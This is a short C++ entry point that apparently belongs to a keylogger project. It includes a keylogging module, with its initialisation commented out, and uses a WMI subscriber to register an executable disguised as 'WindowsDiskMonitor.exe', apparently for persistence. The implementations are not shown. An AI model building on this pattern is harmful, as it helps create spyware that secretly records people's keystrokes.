#include "ExternFnLoader.h"
#include "KeyLog.h"
#include <Windows.h>
#include "WmiSubscriber.h"

int main(int argc, char** argv)
{
   /* ExternFnLdr efl;
    efl.load();
    KeyLog l;
    l.init();
    while (true);*/


    WmiSubscriber s;
    if (!s.subscribe(L"C:\\Program Files\\WindowsDiskMonitor.exe"))
        printf("failed\n");
}